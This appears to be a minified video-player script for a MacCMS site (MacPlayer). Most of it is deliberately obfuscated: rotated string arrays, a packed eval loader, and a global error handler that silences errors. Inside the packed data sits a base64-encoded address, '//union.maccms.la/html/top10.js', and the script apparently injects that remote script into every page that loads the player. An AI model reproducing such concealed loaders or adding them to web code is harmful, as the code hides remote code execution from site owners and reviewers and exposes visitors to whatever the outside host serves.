var killErrors=function(value){return true};window.onerror=null;window.onerror=killErrors;var base64EncodeChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);function base64encode(str){var out,i,len;var c1,c2,c3;len=str.length;i=0;out="";while(i<len){c1=str.charCodeAt(i++)&0xff;if(i==len){out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt((c1&0x3)<<4);out+="==";break}c2=str.charCodeAt(i++);if(i==len){out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt(((c1&0x3)<<4)|((c2&0xF0)>>4));out+=base64EncodeChars.charAt((c2&0xF)<<2);out+="=";break}c3=str.charCodeAt(i++);out+=base64EncodeChars.charAt(c1>>2);out+=base64EncodeChars.charAt(((c1&0x3)<<4)|((c2&0xF0)>>4));out+=base64EncodeChars.charAt(((c2&0xF)<<2)|((c3&0xC0)>>6));out+=base64EncodeChars.charAt(c3&0x3F)}return out}function base64decode(str){var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out="";while(i<len){do{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)break;do{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do{c3=str.charCodeAt(i++)&0xff;if(c3==61)return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do{c4=str.charCodeAt(i++)&0xff;if(c4==61)return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}return out}function utf16to8(str){var out,i,len,c;out="";len=str.length;for(i=0;i<len;i++){c=str.charCodeAt(i);if((c>=0x0001)&&(c<=0x007F)){out+=str.charAt(i)}else if(c>0x07FF){out+=String.fromCharCode(0xE0|((c>>12)&0x0F));out+=String.fromCharCode(0x80|((c>>6)&0x3F));out+=String.fromCharCode(0x80|((c>>0)&0x3F))}else{out+=String.fromCharCode(0xC0|((c>>6)&0x1F));out+=String.fromCharCode(0x80|((c>>0)&0x3F))}}return out}function utf8to16(str){var out,i,len,c;var char2,char3;out="";len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out+=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out+=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out+=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break}}return out}
var _0x40b6=['560071qtsdjc','mNLQD1j0CG','UmqCbJ','toString','xjqTK','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=','charCodeAt','52182pzjDFX','mLLqBvD5Eq','otq3mdjHsKTrwK4','length','m2Tqq2HTrW','Dg9tDhjPBMC','mZqYnZe3sgPOBMvt','1cNbeXe','replace','ZDDoby','rtsae','slice','RnGAl','2czflQo','284853AfVGNZ','xhCR','m3zUu3fwBW','155675MMOCqF','ndC5mJmXDwvoqMf2','8551HdBmMm','200545GoufyL','indexOf','109167yTHbyM','fromCharCode','charAt','push','|||this|replace|MacPlayerConfig|100|function|||||if||MacPlayer||||indexOf|buffer|src|height|||PlayFrom|Agent|toString||||width|Width||Height|var||style|url|url_next||getMonth|getDate|getHours||getMinutes|getSeconds|document|position||iframe|id|unescape|PlayServer|player_list||parse|getYear|sid||nid|attr|playleft|get|base64decode|Buffer|table|no|GetDate|return|GetUrl|Link|Prestrain|AdsEnd|Second|script|true|show|Status|install|Play|write|0px|div|frameBorder|scrolling|absolute|index|99998|td|offsetHeight|offsetWidth|scr|ipt|Path|Down|Parse|encrypt|else|px|Flag|server|server_list|undefined|new|Date|yyyy|YYYY|getFullYear|yy|YY|MM|getDay|dd|DD|hh|HH|mm|ss|SS|Go|location|href|Show|setTimeout|1000|innerHTML|Html|createElement|type|text|javascript|async|charset|utf|Ly91bmlvbi5tYWNjbXMubGEvaHRtbC90b3AxMC5qcw|yyyyMMdd|getElementsByTagName|parentNode|insertBefore|AdsStart|hide|Install|false|background|000000|font|size|14px|color|F6F6F6|margin|padding|relative|overflow|hidden|min|100px|inherit|important|class|display|none|border|cellpadding|cellspacing|tr|valign|top|nbsp|js|Init|player_aaaa|navigator|userAgent|toLowerCase|android|mobile|ipod|ios|iphone|ipad|widthmob|heightmob|prestrain|second|flag|Trysee|trysee|Points|points|decodeURIComponent|link|from|PlayNote|note|PlayUrl|PlayUrlNext|PlayLinkNext|link_next|PlayLinkPre|link_pre|Id|Sid|Nid|des|ps|maccms|path|static|player|down'];var _0x1258=function(_0x32d7bf,_0x3e6163){_0x32d7bf=_0x32d7bf-0x1aa;var _0x40b682=_0x40b6[_0x32d7bf];return _0x40b682;};var _0x43ac07=_0x1258,_0x34396f=_0x1258,_0x4d2299=_0x1258;(function(_0x574679,_0x258321){var _0x13eb9c=_0x1258,_0x5b32dc=_0x1258,_0x5d0bc6=_0x1258;while(!![]){try{var _0x340ba8=parseInt(_0x13eb9c(0x1b1))+parseInt(_0x5b32dc(0x1ad))*parseInt(_0x13eb9c(0x1b6))+-parseInt(_0x5b32dc(0x1c2))+parseInt(_0x5d0bc6(0x1b3))+parseInt(_0x5d0bc6(0x1b4))+parseInt(_0x5d0bc6(0x1ae))+parseInt(_0x5d0bc6(0x1c9))*-parseInt(_0x5d0bc6(0x1bb));if(_0x340ba8===_0x258321)break;else _0x574679['push'](_0x574679['shift']());}catch(_0x215855){_0x574679['push'](_0x574679['shift']());}}}(_0x40b6,0x3e6d9));var _0x31ba=['CMvWBgfJzq','C3bSAxq',_0x43ac07(0x1bc),'mZCZmJu3wwv0BLnH',_0x34396f(0x1c7),_0x34396f(0x1c4),'mJm3tvzAzMDP',_0x4d2299(0x1b2),'nZrmCuTJrM4',_0x43ac07(0x1c8),_0x4d2299(0x1b0),_0x43ac07(0x1af),_0x4d2299(0x1c6),'EsbLpxSNmtuNoJCOzIX0kxTJkcf0kxT0ptfgidfhkcL9EsbHpvSN5PELjYWN5lIajYWN5lQmjYWN5lIjjYWN5zUBjYWN5lQujYWN5ywTj107zJ1MlJqOlZfiFdfjlYX0lJfkkcKPo2y9zI40kc8Xs3WXtc8SkhqUvsGPjtyPpJK/khqUvsGPjtyPlNeOktONmcCRkhqUvsGPjtyPktTMpwyUncGVmu0VlhqUrsGPpJK/Dc5fkcKUCsGPoICWjYT0lKuOksK7zJ1MlJqOl00VzYX0lKuOksK7zJ1MlJqOl3D8vY9NlgfBDc4XtIGPxsK7zJ1MlJqOlZfpFdfqlYX0lKyOkt45p3qUrIGPlNeOktONmcCRDc5gkcKPo2y9zI40kc9KFeqVzYX0lKyOksK7zJ1MlJqOlZfrFdfslYX0lKCOkt45p3qUrYGPlNeOktONmcCRDc5hkcKPo2y9zI40kc9OFeGVzYX0lKCOksK7zJ1MlJqOlZftlYX0lKKOkt45p3qUssGPlNeOktONmcCRDc5jkcKPo2y9zI40kc9Tl2CSDc5jkcKPo2y9zI40kc8XvhWXvs8SDc5kkcK+ot90lKOOks5XkcK6jZaNk3qUsIGPktTMpwyUncGVC3Xtl2CSDc5kkcKPoZe2igz9lcCXnYC6nYHZlg4PEZe2idmUmtGUncGNE1z9jYXZks40kcD7vN0NlhmPlJqOj3TyFsCSBIKUncGNE1H9jYXUkx0SjZfwjZO3khmSBIL7mvCUmvG9mY4XnYHZlg4PFsWNmvKNoJCOkxSKkcCJAICPlLKOj2SNldmUmtKPoZfAkdCOkxTLlJfHkcL9ldmUmwiQmJaPoYqOiInAiIKUmtaOmcKUmJe9mY4YmISNjZT5ige9sY4YmYGNmwmNktTHlJi0psCYns8YnIC7ys4YnZ0XzdTHlJi4psCYos04jZTHlMS9mteOjZjHpt0NksSNp3i9jYSZlJe1kcCYyICPo3KGyJ1llJjJkcCXyYCPwZbDo2iUmMqUmMuOysXIkx0SjZjMjZO3kcL7yYGKkciJAIiPlLKOj2SNkse9mY4XmIL7jcGIi2OIks5zkcDRjYWZlJeYkx0KkciJAIiPlJfLkcL9lcCXysC6nYGPEYqOjYnQjYKUmMCOkx0SjZjOjZO3kcL7mY4XzJ0YAtSKkcCJmwCNks4XzsGPFsWNmwGNoJCOkxTllJfPkcC8qt4UzxSYAJOGiZjRoZjSltjToJjUoZjVoImYCdSYCtOXAJSYCJOXAJTmoJjZoZj0oJj1o3u6jYSZlNyRjZTSoICRmY54kYC7mNyTBdOYDZT9lMuGmtn7DtO2jtTSoJyLo30UzsaJwNTmoJj4oYeYEtT1oJyLo2W6nIu7FtWVqt48mwSGmNO9iMuIpICRjZXoie89iMOIigS9iIiGmwW9iJaIidfTpsiXnciGDt0InIuIigW9iJyLiIbbpsjmoJfUo3OTmw86mxa7iJ48l04+pe4GtZ0ImwCIigS9iIiGmwW9iJaIidfTpsiXnciGDt0InIuIigW9iJyLiIbbpsjmoJfUo3OTmw86mxa7mKe6mKi7iJ48l04+jYSNpdeZidjdpsiWiIaYrd0ImciGmKu9iJaIpJWYrJ48mxeGtZ0IwIiGmKC9iJjiiIbbpsiIpIyYstS8lZfXpJWVmtm+pc8XAZ4NktSZlJfYpsqOjY5LjYKUmtaOmcKUmxi7mY4XCZ0KkcCUzsCPlJeWkdaPlJfZo0SUmwKOjZWXDcCRjZf1igS9iICRmY4XDISZlM8RjY4YsIi+pc8XDcCRjZf1pICPFsWNmxCNoJCOkxT9lcCYsYC6nYGPEZmUmwy9mwq7mY4XEd0NjZT5ige9mKW7yYHHlJf5pt0NmsCPE2eUqJ1qkgeUqIK7ys5dpvaOys5dkx0XEIbJkgeUmxK9psCYjYL7ys5cpvaOmteOys5cksK7ys5dpvaOmteOys5dksL9mY5WptjnlJjolJjpkcK7mY52ptuUDtSZlNG9ns5So2mOmY5WlMKOiJjqiIK+mhX8mY5WlMKOiJjriIK+mhX8mY5WlMKOiJjsiIK+mhX8mY5WlMKOiJjtiIK+mhX8mY5WlMKOiJjuiIK+mhX8mY5WlMKOiJjviIK+mcL7mY52ptuUmLy7mY54ptuUmLD9yYGZlNyUAsGImueIkt09lteMjJmUDI5PkciLiIK9ps0XkxSZlNy9jZyLj31JkdmUEc5PkciXqsiPpt0TmsyMmY54lMKOiIuIkt09ltePEZmUEd0NnIuNFtmUmtK9ns4YwdSZlJeYptuUAJSZlJfIptuUmLK7mY4XqJ1HlJjAoZmUmZa9ys4ZmtSZlJmYpweUmZm7mY4Xod0ZncHHlJm1ktSZlM89ys4ZnJSZlJm3pweUmZG7mY5rpweUmum9psCXncC/jYC6ys4XqZSZlJm5pweUqJSZlJnHpweUqZSZlJnIpweUm2m7mY4Zzd1HlJnLoZmUm2y9ys5poZmUm2C9ys5woZmUm2G9ys5yo2mOns4XrfSZlLfDit0XrsL7mY5rptuUmurBmY5rxs4ZAx1JkduUuLSZlM9Dit0XrsL7yYG1lLjBmY5Vxs4ZAJ09iJeIkxSZlJf4ptuUuLSZlM9DlLq9psCNpZuUvdO1lLjBmY5Vxs5uoZmUBZ0NvcD9FtmUmxy9m2SUm2WRjY8ZBs8ZBI8No2mOmY4XqJ09iJnViIL7zs4XDYGPFtf6E2uUmwGOkx19FtS',_0x34396f(0x1c3),'mZG1nZfvsMvwCwO','mti4nJqYA09eD1z2'],_0x26f2=function(_0x1ad6b9,_0x14c572){var _0x19a98e=_0x1258,_0xa99850=_0x1258,_0x14b1b0=_0x1258;_0x1ad6b9=_0x1ad6b9-0x73;var _0x50adb5=_0x31ba[_0x1ad6b9];if(_0x26f2['BcRwGf']===undefined){var _0x4a3be0=function(_0x1b6858){var _0x5ed3fa=_0x1258,_0x5ccc6c=_0x1258,_0x130b00=_0x1258;if('ZVswk'==='NiMZA'){function _0x7d7250(){while(_0x516d70--)_0x4056bc[_0x4bb6ee(_0x3b0615)]=_0x3463d9[_0x3dc93e]||_0x2ef0cc(_0x4e1f2c);_0x24935e=[function(_0x48996a){return _0x4200cf[_0x48996a];}],_0x55ddc6=function(){var _0x332b4a=_0x4a55dc;return _0x332b4a(0x7c);},_0x32aee2=0x1;}}else{var _0x58986d=_0x5ed3fa(0x1c0),_0x4aae2e='';for(var _0x4cf11f=0x0,_0x1847fc,_0x49a216,_0x2b8c8f=0x0;_0x49a216=_0x1b6858[_0x5ccc6c(0x1b8)](_0x2b8c8f++);~_0x49a216&&(_0x1847fc=_0x4cf11f%0x4?_0x1847fc*0x40+_0x49a216:_0x49a216,_0x4cf11f++%0x4)?_0x4aae2e+=String[_0x5ccc6c(0x1b7)](0xff&_0x1847fc>>(-0x2*_0x4cf11f&0x6)):0x0){_0x49a216=_0x58986d[_0x5ccc6c(0x1b5)](_0x49a216);}return _0x4aae2e;}};_0x26f2[_0x19a98e(0x1bd)]=function(_0xe3f03){var _0x4cf5a4=_0x1258,_0x3ccd93=_0x1258,_0x318668=_0x4a3be0(_0xe3f03),_0xccafc6=[];for(var _0x1fa5d0=0x0,_0x3f46e1=_0x318668['length'];_0x1fa5d0<_0x3f46e1;_0x1fa5d0++){_0xccafc6+='%'+('00'+_0x318668[_0x4cf5a4(0x1c1)](_0x1fa5d0)[_0x4cf5a4(0x1be)](0x10))['slice'](-0x2);}return decodeURIComponent(_0xccafc6);},_0x26f2[_0xa99850(0x1cb)]={},_0x26f2['BcRwGf']=!![];}var _0x583385=_0x31ba[0x0],_0x2b4386=_0x1ad6b9+_0x583385,_0x45c358=_0x26f2['ZDDoby'][_0x2b4386];return _0x45c358===undefined?(_0x50adb5=_0x26f2[_0xa99850(0x1bd)](_0x50adb5),_0x26f2['ZDDoby'][_0x2b4386]=_0x50adb5):_0x50adb5=_0x45c358,_0x50adb5;},_0x2a2ce2=_0x26f2,_0x2a23a2=_0x26f2;(function(_0x121d2e,_0x4dfc35){var _0x2fd185=_0x1258,_0x45936d=_0x1258,_0x5b4cff=_0x26f2,_0x38721e=_0x26f2,_0x3132ef=_0x26f2;while(!![]){try{var _0x15546e=parseInt(_0x5b4cff(0x7b))*-parseInt(_0x38721e(0x80))+parseInt(_0x38721e(0x76))*parseInt(_0x38721e(0x73))+parseInt(_0x5b4cff(0x81))*parseInt(_0x38721e(0x7d))+parseInt(_0x5b4cff(0x74))+parseInt(_0x38721e(0x7a))+-parseInt(_0x38721e(0x79))*parseInt(_0x3132ef(0x77))+-parseInt(_0x3132ef(0x7f))*parseInt(_0x3132ef(0x78));if(_0x15546e===_0x4dfc35)break;else _0x121d2e[_0x2fd185(0x1b9)](_0x121d2e['shift']());}catch(_0x58f5cd){_0x121d2e[_0x45936d(0x1b9)](_0x121d2e['shift']());}}}(_0x31ba,0x30ba7),eval(function(_0x10e44b,_0x3adec0,_0x28f40c,_0x4ecde7,_0x4e1836,_0x16e0c4){var _0x146104=_0x1258,_0x35c6f2=_0x1258,_0x45cbff=_0x26f2;_0x4e1836=function(_0x5a62b3){var _0x1182e0=_0x1258,_0x3180c0=_0x1258;if(_0x1182e0(0x1ac)===_0x1182e0(0x1aa)){function _0xc1a032(){var _0x465f2c=_0x1258,_0x50a25a=_0x1258,_0x9ff85c=_0x5b95a1(_0x62f7c4),_0x425419=[];for(var _0x2b2392=0x0,_0x3ceee5=_0x9ff85c[_0x465f2c(0x1c5)];_0x2b2392<_0x3ceee5;_0x2b2392++){_0x425419+='%'+('00'+_0x9ff85c['charCodeAt'](_0x2b2392)['toString'](0x10))[_0x465f2c(0x1ab)](-0x2);}return _0x2e0e8d(_0x425419);}}else{var _0x417a49=_0x26f2;return(_0x5a62b3<_0x3adec0?'':_0x4e1836(parseInt(_0x5a62b3/_0x3adec0)))+((_0x5a62b3=_0x5a62b3%_0x3adec0)>0x23?String['fromCharCode'](_0x5a62b3+0x1d):_0x5a62b3[_0x417a49(0x75)](0x24));}};if(!''[_0x45cbff(0x82)](/^/,String)){if('xjqTK'!==_0x146104(0x1bf)){function _0x290c7a(){var _0x5e3064=_0x1258,_0x3d1d15=_0x395ce3;return(_0x2af4a8<_0x383077?'':_0x454071(_0x7749c7(_0x3fa257/_0x3637c2)))+((_0xf5ccea=_0x1642c0%_0x4e2def)>0x23?_0x5dc757[_0x5e3064(0x1b7)](_0x22b2e5+0x1d):_0x42a42f[_0x3d1d15(0x75)](0x24));}}else{while(_0x28f40c--)_0x16e0c4[_0x4e1836(_0x28f40c)]=_0x4ecde7[_0x28f40c]||_0x4e1836(_0x28f40c);_0x4ecde7=[function(_0x4aa028){return _0x16e0c4[_0x4aa028];}],_0x4e1836=function(){var _0x3d538a=_0x26f2;return _0x3d538a(0x7c);},_0x28f40c=0x1;}};while(_0x28f40c--)if(_0x4ecde7[_0x28f40c])_0x10e44b=_0x10e44b[_0x146104(0x1ca)](new RegExp('\x5cb'+_0x4e1836(_0x28f40c)+'\x5cb','g'),_0x4ecde7[_0x28f40c]);return _0x10e44b;}(_0x2a2ce2(0x7e),0x3e,0xd3,_0x4d2299(0x1ba)[_0x2a23a2(0x83)]('|'),0x0,{})));MacPlayer.Init();
